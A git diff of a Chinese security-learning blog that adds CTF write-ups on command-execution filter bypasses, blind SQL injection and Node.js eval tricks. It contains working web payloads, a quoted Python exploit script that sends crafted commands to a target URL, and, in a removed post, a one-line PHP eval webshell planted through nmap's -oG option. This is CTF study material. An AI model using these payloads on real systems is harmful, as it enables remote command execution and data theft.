@@ -147,6 +147,176 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/24/%E5%B0%8F%E5%86%85%E5%8D%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/24/%E5%B0%8F%E5%86%85%E5%8D%B7/" class="post-title-link" itemprop="url">小内卷</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-04-24 21:42:32 / Modified: 23:41:22" itemprop="dateCreated datePublished" datetime="2021-04-24T21:42:32+08:00">2021-04-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>二队实力有限，所以康师傅出题还算友好。</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>题目链接：106.54.90.137:2333<br><img src="/2021/04/24/%E5%B0%8F%E5%86%85%E5%8D%B7/1.0.png"><br>题目给了一个输入框，源码查看到有hint.txt提示，发现给了路径</p>
+<pre><code>give you hint : /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games: </code></pre>
+<p>在CTFshow做了二十多个命令执行，没遇到过这种，知识盲区了</p>
+<p>后来干脆在题库里面找，发现月饼杯web3<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108827377%E5%92%8C%E8%BF%99%E4%B8%AA%E5%BE%88%E5%83%8F%EF%BC%8C%E6%96%B9%E6%B3%95%E4%B8%80%E8%87%B4%E3%80%82">https://blog.csdn.net/qq_46091464/article/details/108827377和这个很像，方法一致。</a></p>
+<p>而且这个题更直接：利用路径中涉及到的字母（使用$PATH环境变量来截取字母）构造payload</p>
+<p>想用的是: nl flag.php即nl ????.???（要包含一个字母，否则会混乱）</p>
+<p>最终payload：</p>
+<pre><code>$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ?$&#123;PATH:5:1&#125;??.???</code></pre>
+<p>构造的方法不赘述了，解出来信心倍增</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>题目链接：106.54.90.137:2334<br>sql注入一直是我的短板（其实我啥也不行）</p>
+<p>学习sql注入的过程，看了wustais康师傅做的视频，看乌鸦的PPT，同时在sqllab有练习。对各种类型的SQL注入题目都有些了解</p>
+<p>这题很明显就是sqllab第8题改编的，界面都差不多：</p>
+<p>id=1 回显You are in………..典型的布尔盲注：</p>
+<p>三种回显：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You are in...........输入语句正确</span><br><span class="line">Welcome    Hacker   （相比之下就是无回显）说明语句错误</span><br><span class="line">you are too young!      含有被过滤的关键词</span><br></pre></td></tr></table></figure>
+<p>先Fuzz测试看过滤<br><img src="/2021/04/24/%E5%B0%8F%E5%86%85%E5%8D%B7/1.1.png"><br>然后被这个测试结果误导了，我以为select也被过滤了，懵逼了好长时间，绕也绕不过</p>
+<p>知道康师傅在群里给提示才发现select可能没被ban，试用了一下也确实可以</p>
+<p>具体的每一步payload不写了，附个链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/a1309525802/article/details/105421515%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E4%BD%93">https://blog.csdn.net/a1309525802/article/details/105421515介绍了几个关键字被过滤的绕过方体</a></p>
+<p>没啥大问题，大问题就是脚本不会用，全手敲，主要是时间留的足，也确实够恶心，BP都给我敲冒烟了</p>
+<p>涉及到的知识在之后的sql注入总结中再详细补充</p>
+<h2 id="有感"><a href="#有感" class="headerlink" title="有感"></a>有感</h2><p>做题之前很忐忑，毕竟自己前段时间没怎么学，有自知之明。</p>
+<p>解sql注入的时候走了很多弯路，第一次解布尔盲注的题目，很多细节问题没注意，爆破的时候漏洞百出</p>
+<p>之后好好学，希望在大赛上有输出</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/22/nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/22/nodejs/" class="post-title-link" itemprop="url">nodejs</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-22 19:45:57" itemprop="dateCreated datePublished" datetime="2021-04-22T19:45:57+08:00">2021-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-23 21:44:26" itemprop="dateModified" datetime="2021-04-23T21:44:26+08:00">2021-04-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>后天会遇到Node.js题目，突击一哈</p>
+<h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><p>P神：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/200406.html">https://www.freebuf.com/articles/web/200406.html</a></p>
+<h1 id="toUpperCase与toLowerCase"><a href="#toUpperCase与toLowerCase" class="headerlink" title="toUpperCase与toLowerCase()"></a>toUpperCase与toLowerCase()</h1><p>toUpperCase()：小写变大写，字符ı、ſ 经处理后结果为 I、S</p>
+<p>toLowerCase()：大写变小写，字符İ会转变为i，字符K经处理后结果为k</p>
+<p>CTFshow334</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return users.find(function(item)&#123;</span><br><span class="line">  return name!&#x3D;&#x3D;&#39;CTFSHOW&#39; &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>name不等于CTFSHOW，但是经过toUpperCase之后的name=CTFSHOW,得</p>
+<pre><code>name=ctfſhow 或 ctfshow</code></pre>
+<h1 id="fs模块和child-process模块"><a href="#fs模块和child-process模块" class="headerlink" title="fs模块和child_process模块"></a>fs模块和child_process模块</h1><h2 id="fs模块：可以用来读取文件以及查看目录"><a href="#fs模块：可以用来读取文件以及查看目录" class="headerlink" title="fs模块：可以用来读取文件以及查看目录"></a>fs模块：可以用来读取文件以及查看目录</h2><p>先补充知识：<br><img src="/2021/04/22/nodejs/1.0.png"><br>则利用</p>
+<pre><code>?eval=_filename  //获得当前的模块文件路径</code></pre>
+<p>require（’fs’）</p>
+<p>fs.readdirSync(path[, options])//可以用来查看目录<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const fs &#x3D; require(&#39;fs&#39;)</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">  const data &#x3D; fs.readFileSync(&#39;&#x2F;Users&#x2F;joe&#x2F;test.txt&#39;, &#39;utf8&#39;)</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125; catch (err) &#123;</span><br><span class="line">  console.error(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看当前目录：fs.readdirSync(.) 用点来查看当前目录</p>
+<p>查看到了当前目录，那么读取当前目录下的文件内容要用到的函数就是：</p>
+<p>fs.readfileSync(1.txt)即可读取 。<br>这里给出playload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?eval&#x3D;reqrise(&#39;fs&#39;).readdirSync(.)  查看当前目录</span><br><span class="line">?eval&#x3D;require(&#39;fs&#39;).readfileSync(1.txt) 读取文件</span><br></pre></td></tr></table></figure>
+<p>web336：根据_filename读到的路径（源码），利用fs模块读取文件</p>
+<pre><code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code></pre>
+<p>web336法二：或者利用fs模块读取当前目录的文件名，然后再利用fs模块读取这个文件：：<br>    ?eval=require(‘fs’).readdirSync(‘.’)<br>    ?eval=require(‘fs’).readFileSync(‘fl001g.txt’,’utf-8’)</p>
+<h2 id="child-process模块："><a href="#child-process模块：" class="headerlink" title="child_process模块："></a>child_process模块：</h2><p>child_process:简单来说就可以理解成 具有命令执行的模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;).execSync(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;&#x2F;&#39; ] ).stdout.toString()&#x2F;&#x2F;查看下一层的目录</span><br><span class="line"></span><br><span class="line">require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();</span><br><span class="line"></span><br><span class="line">require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>web336：读源码发现过滤了exec,利用和ssti中类似的绕过手法:</p>
+<pre><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -178,7 +348,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-22 09:41:42" itemprop="dateModified" datetime="2021-04-22T09:41:42+08:00">2021-04-22</time>
+                <time title="Modified: 2021-04-24 21:13:39" itemprop="dateModified" datetime="2021-04-24T21:13:39+08:00">2021-04-24</time>
               </span>
 
           
@@ -213,7 +383,8 @@
 <p>linux 语法过滤了分号，可以用 %0a 来绕过（相当于回车）</p>
 <p>PHP语法过滤了分号 可用 ?&gt;来绕过</p>
 <p>利用反斜杠 比如对cat进行限制 我们可以用 ca\t 绕过 ，过滤了 flag , php 我们用 fl\ag.p\hp 绕过</p>
-<h1 id="利用include函数-伪协议绕过大部分过滤"><a href="#利用include函数-伪协议绕过大部分过滤" class="headerlink" title="利用include函数+伪协议绕过大部分过滤"></a>利用include函数+伪协议绕过大部分过滤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="利用include函数-伪协议绕过大部分过滤"><a href="#利用include函数-伪协议绕过大部分过滤" class="headerlink" title="利用include函数+伪协议绕过大部分过滤"></a>利用include函数+伪协议绕过大部分过滤</h1><p>32</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>该ban的都ban了（过滤内容太多，绕过太麻烦或无法绕过考虑文件包含）</p>
 <pre><code>?c=include$_POST[1]?&gt; //include和$_POST之间没有空格
 POST: 1=php://filter/read=convert.base64-encode/resource=flag.php
@@ -249,7 +420,23 @@ c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZm
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#-- coding:UTF-8 --</span><br><span class="line"># Author:dota_st</span><br><span class="line"># Date:2021&#x2F;2&#x2F;10 12:56</span><br><span class="line"># blog: www.wlhhlc.top</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from sys import *</span><br><span class="line">if(len(argv)!&#x3D;2):</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    print(&#39;USER:python exp.py &lt;url&gt;&#39;)</span><br><span class="line">    print(&quot;eg:  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)</span><br><span class="line">    print(&quot;exit: input exit in function&quot;)</span><br><span class="line">    print(&quot;&#x3D;&quot;*50)</span><br><span class="line">    exit(0)</span><br><span class="line">url&#x3D;argv[1]</span><br><span class="line"></span><br><span class="line">#生成可用的字符</span><br><span class="line">def write_rce():</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    preg &#x3D; &#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#39;</span><br><span class="line">    for i in range(256):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):</span><br><span class="line">                k &#x3D; i | j</span><br><span class="line">                if k &gt;&#x3D; 32 and k &lt;&#x3D; 126:</span><br><span class="line">                    a &#x3D; &#39;%&#39; + hex(i)[2:].zfill(2)</span><br><span class="line">                    b &#x3D; &#39;%&#39; + hex(j)[2:].zfill(2)</span><br><span class="line">                    result +&#x3D; (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)</span><br><span class="line">    f &#x3D; open(&#39;rce.txt&#39;, &#39;w&#39;)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line">#根据输入的命令在生成的txt中进行匹配</span><br><span class="line">def action(arg):</span><br><span class="line">    s1&#x3D;&quot;&quot;</span><br><span class="line">    s2&#x3D;&quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f&#x3D;open(&quot;rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t&#x3D;f.readline()</span><br><span class="line">            if t&#x3D;&#x3D;&quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0]&#x3D;&#x3D;i:</span><br><span class="line">                s1+&#x3D;t[2:5]</span><br><span class="line">                s2+&#x3D;t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">    return(output)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    write_rce()</span><br><span class="line">    while True:</span><br><span class="line">        s1 &#x3D; input(&quot;\n[+] your function：&quot;)</span><br><span class="line">        if s1 &#x3D;&#x3D; &quot;exit&quot;:</span><br><span class="line">            break</span><br><span class="line">        s2 &#x3D; input(&quot;[+] your command：&quot;)</span><br><span class="line">        param&#x3D;action(s1) + action(s2)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;c&#39;:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        print(&quot;\n[*] result:\n&quot;+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.1.png"></p>
 <p>//42-53直接输命令，和前面的如出一辙</p>
-<h1 id="用原始路径-通配符绕过"><a href="#用原始路径-通配符绕过" class="headerlink" title="用原始路径+通配符绕过"></a>用原始路径+通配符绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<h1 id="用原始路径-通配符绕过"><a href="#用原始路径-通配符绕过" class="headerlink" title="用原始路径+通配符绕过"></a>用原始路径+通配符绕过</h1><p>54</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这里采用.*的通配模式，导致很多东西用不了，但是这里我们可以用命令的路径+?通配符来绕过</p>
+<pre><code>payload:/bin/ca?$&#123;IFS&#125;f???????</code></pre>
+<p>还有另一个读取的命令grep可以使用</p>
+<p>grep flag flag.php 查找flag.php文件中含有flag的那一行，并且打印出来</p>
+<p>所以我们可以构造payload如下，在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})</p>
+<pre><code>?c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</code></pre>
+<h1 id="结合-tmp下临时文件-来getshell"><a href="#结合-tmp下临时文件-来getshell" class="headerlink" title=".结合/tmp下临时文件 来getshell"></a>.结合/tmp下临时文件 来getshell</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这个题过滤了大小写字母，一开始我想的是用异或来构造马，但是这里不是eval()函数，而是system()函数，所以不能这样做。看了P神的一篇文章，豁然开朗。文章链接：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p>几个关键的地方：</p>
+<p>1.没有过滤 . ，可以用 . + 文件，来执行文件里面的命令，并且即使没有执行权限x，也可以，所以我们可以把我们命令写入文件，且上传。</p>
+<p>2.PHP文件上传临时文件会存储在/tmp目录下，并且是 /tmp/phpXXXXXX ，这里最后一个字母可能是大写(一次不行多试几次)，并且通配符支持匹配的语法。所以我们可以用[ @-[ ]，来匹配大写字母。</p>
+<p>构造文件上传的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;effa0bff-f0e6-42b2-8c5e-b8f1d07d0484.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后抓包修改：</p>
+
       
     </div>
 
@@ -749,147 +936,6 @@ c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZm
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/19/Namp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/19/Namp/" class="post-title-link" itemprop="url">Namp</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-19 16:17:31 / Modified: 17:13:46" itemprop="dateCreated datePublished" datetime="2021-03-19T16:17:31+08:00">2021-03-19</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>输入ip：127.0.0.1</p>
-<p>看到这里返回了nmap扫描的结果</p>
-<p>127.0.0.1 | ls查看目录，发现|被转义，其他命令也不能用</p>
-<p>用之前  [BUUCTF 2018]Online Tool  用到过的oG命令实现代码写入，构造payload，来利用‘拼接，写入我们想要的shell文件</p>
-<pre><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></pre>
-<p>php被过滤，</p>
-<p>（1）利用&lt;?=来代替&lt;?php进行绕过</p>
-<p>（2）利用phtml来代替shell.php的文件后缀</p>
-<pre><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#39;</code></pre>
-<p>返回发现上传成功，可蚁剑登录，也可以hackbar进行post传参</p>
-<pre><code>cmd=readfile(&quot;/flag&quot;)</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
